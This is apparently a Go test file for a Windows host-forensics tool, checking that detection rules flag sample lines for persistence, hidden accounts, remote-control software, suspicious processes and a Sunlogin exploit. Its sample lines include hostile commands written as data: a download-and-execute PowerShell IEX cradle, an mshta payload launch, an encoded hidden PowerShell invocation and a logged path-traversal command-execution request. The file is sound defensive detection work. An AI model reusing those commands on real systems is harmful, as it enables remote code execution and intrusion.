package windows

import (
	"slices"
	"testing"

	"karma/internal/model"
	"karma/internal/reader"
	"karma/internal/testkit"
)

// Rule hits for the new system-surface checks: each case picks one sample line shaped like real output.
func TestSystemCheckRules(t *testing.T) {
	cases := []struct {
		id   string
		text string
		want string
	}{
		{"software", `mimikatz 2.2.0 | 2.2.0 | 20250101`, "software-pentest"},
		{"software", `向日葵远程控制 | 15.2 | 20250101`, "software-remote"},
		{"env-vars", `    Path    REG_EXPAND_SZ    C:\Windows\system32;C:\Temp\bin\`, "env-path-suspicious"},
		{"env-vars", `    Path    REG_EXPAND_SZ    C:\Windows\system32;C:\Temp`, "env-path-suspicious"},
		{"shares", `backup -> D:\backup`, "custom-share"},
		{"rdp-config", `    fDenyTSConnections    REG_DWORD    0x0`, "rdp-enabled"},
		{"rdp-config", `    UserAuthentication    REG_DWORD    0x0`, "rdp-nla-off"},
		{"local-users", `hack$  enabled    2025-06-01 03:00:00  `, "local-user-hidden"},
		{"admin-group", `WIN-XXX\hack$  LocalGroup`, "admin-group-dollar"},
		{"processes", `4321  evil.exe  C:\Users\Public\Temp\evil.exe -enc AAAA`, "proc-temp-exe"},
		{"processes", `4322  powershell.exe  powershell.exe -nop -w hidden -enc AAAA`, "proc-payload"},
		{"connections", `  TCP    10.0.0.5:52134    1.2.3.4:4444    ESTABLISHED     4321`, "conn-evil-port"},
		{"win-hosts", `10.0.0.8    git.internal.corp`, "hosts-map"},
		{"run-keys", `    Backdoor    REG_SZ    C:\Users\Public\Files\evil.exe`, "autorun-temp"},
		{"run-keys", `    ScEval    REG_SZ    mshta http://x/y.hta`, "autorun-payload"},
		{"nt-services", `EvilSvc  Running  Auto  C:\Windows\Temp\svc.exe`, "svc-temp"},
		{"nt-services", `Legacy  Running  Auto  C:\Program Files (x86)\Some App\app.exe`, "svc-unquoted"},
		{"tasks", `\EvilUpdate  Ready  C:\Users\Public\Files\evil.exe -arg`, "task-userpath"},
		{"wmi-subscription", `CommandLineTemplate : C:\Windows\Temp\evil.exe`, "wmi-consumer"},
		{"scriptblock-log", `2025-06-01 03:00:00  IEX (New-Object Net.WebClient).DownloadString('http://x')`, "scriptblock-payload"},
		{"remote-control", `HKLM\SOFTWARE\TeamViewer`, "remote-ctrl-registry"},
		{"remote-control", `RustDesk  Running`, "remote-ctrl-service"},
		{"ifeo", `    Debugger    REG_SZ    C:\Windows\System32\cmd.exe`, "ifeo-debugger"},
		{"winlogon", `    Shell    REG_SZ    C:\Windows\Temp\shell.exe`, "winlogon-shell"},
		{"winlogon", `    Userinit    REG_SZ    C:\Windows\system32\evil.exe,userinit.exe,`, "winlogon-userinit"}, {"winlogon", `    Notify    REG_SZ    C:\Windows\notify.dll`, "winlogon-notify"},
		{"winlogon", `    AppInit_DLLs    REG_SZ    C:\Windows\Temp\evil.dll`, "appinit-dlls"},
		{"winlogon", `    LoadAppInit_DLLs    REG_DWORD    0x1`, "appinit-load"},
		{"appcompat", `    C:\Users\Public\files\evil.exe    REG_SZ    ~ RUNASADMIN`, "appcompat-userpath"},
		{"appcompat", `C:\Windows\AppPatch\Custom\evil.sdb  2025-06-01 10:00:00`, "appcompat-sdb"},
		{"portproxy", `0.0.0.0         8080        10.0.0.5        80`, "portproxy-forward"},
		{"svc-dll", `WebClient  C:\Windows\Temp\evil.dll`, "svcdll-temp"},
		{"svc-dll", `CustomSvc  C:\Program Files\App\svc.dll`, "svcdll-outside-system"},
		// The Sunlogin client's own log and config: the exploit's two steps, the
		// connection it accepted, and the access code stored beside it.
		{"sunlogin", `2025-04-17 17:53:53.922 - Info - [Acceptor][HTTP] new RC HTTP connection 219.142.42.9:33321, path: /check?cmd=ping../../../../../../windows/system32/whoami, version: HTTP/1.1`,
			"sunlogin-remote-cmd"},
		{"sunlogin", `2025-04-17 17:53:53.850 - Info - [Acceptor][HTTP] new RC HTTP connection 219.142.42.9:33317, path: /cgi-bin/rpc?action=verify-haras, version: HTTP/1.1`,
			"sunlogin-verify-haras"},
		{"sunlogin", `2025-04-17 17:41:10.112 - Info - [service][TcpAcceptor] new acceptor 219.142.42.9:33317-->172.26.18.236:49829`,
			"sunlogin-connection"},
		{"sunlogin", `encry_pwd=XYEFFLTz2p4=`, "sunlogin-access-code"},
	}
	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.id)
		if check == nil {
			t.Fatalf("check %s not in catalog", tc.id)
		}
		if !slices.Contains(testkit.HitIDs(t, tc.text, check), tc.want) {
			t.Errorf("%s should match %s: %q", tc.id, tc.want, tc.text)
		}
	}
	// A normal PATH (no temp/public directory) should not light up the hijack surface
	for _, clean := range []string{
		`    Path    REG_EXPAND_SZ    C:\Windows\system32;C:\Program Files\App\`,
		`    Path    REG_EXPAND_SZ    C:\Users\PublicFiles\bin`,
	} {
		if slices.Contains(testkit.HitIDs(t, clean, testkit.CheckByID(t, All, "env-vars")), "env-path-suspicious") {
			t.Errorf("normal PATH should not match: %q", clean)
		}
	}

	// The logon hooks and service DLLs carry their own exclusions: the stock values
	// stay quiet, and the unexpanded REG_EXPAND_SZ form of a system DLL does too.
	quiet := []struct {
		check string
		text  string
		rule  string
	}{
		{"winlogon", `    Shell    REG_SZ    explorer.exe`, "winlogon-shell"},
		{"winlogon", `    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,`, "winlogon-userinit"},
		{"winlogon", `    AppInit_DLLs    REG_SZ    `, "appinit-dlls"},
		{"winlogon", `    LoadAppInit_DLLs    REG_DWORD    0x0`, "appinit-load"},
		{"svc-dll", `WSearch  C:\Windows\System32\WindowsSearch.dll`, "svcdll-outside-system"},
		{"svc-dll", `W32Time  %SystemRoot%\system32\w32time.dll`, "svcdll-outside-system"},
		// Windows ships DLLs under the whole C:\Windows tree, not only System32:
		// the .NET frameworks and the driver store hold svchost DLLs too
		{"svc-dll", `NetSetup  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\WMINet_Utils.dll`, "svcdll-outside-system"},
		{"svc-dll", `NcaSvc  C:\Windows\System32\drivers\nca.dll`, "svcdll-outside-system"},
		// C:\Windows\Temp is Windows' own tree and stays out of this rule: the
		// loud rule (svcdll-temp) owns that case
		{"svc-dll", `Evil  C:\Windows\Temp\evil.dll`, "svcdll-outside-system"},
	}
	for _, tc := range quiet {
		if slices.Contains(testkit.HitIDs(t, tc.text, testkit.CheckByID(t, All, tc.check)), tc.rule) {
			t.Errorf("%s must stay quiet on: %q (%s)", tc.check, tc.text, tc.rule)
		}
	}
}

// Rule on section titles: 1102 log clearing is a title hit, not a body-line hit.
func TestSecLogClearedTitleRule(t *testing.T) {
	check := testkit.CheckByID(t, All, "sec-log")
	body := model.Body{Sections: []model.BodySection{{
		Title: "1102 Audit Log Cleared",
		Text:  "2025-06-01 03:00:00  已清除审计日志。\n",
	}}}
	document := reader.Read(model.ReadRequest{Check: check, Body: body, Floor: model.FloorAll})
	var ids []string
	for _, section := range document.Sections {
		for _, match := range section.TitleMatches {
			ids = append(ids, match.ID)
		}
	}
	if !slices.Contains(ids, "log-cleared") {
		t.Fatalf("the 1102 section title should match log-cleared: %q", ids)
	}
}

// All new aspects should be in the catalog and their names recognizable by the selector.
func TestNewAspectsInCatalog(t *testing.T) {
	aspects := map[model.Aspect]int{}
	for _, check := range All {
		aspects[check.Aspect]++
	}
	for _, aspect := range []model.Aspect{model.AspectSystem, model.AspectIdentity, model.AspectProcess, model.AspectNetwork, model.AspectPersistence, model.AspectLog} {
		if aspects[aspect] == 0 {
			t.Errorf("aspect %s has no checks", aspect)
		}
	}
}
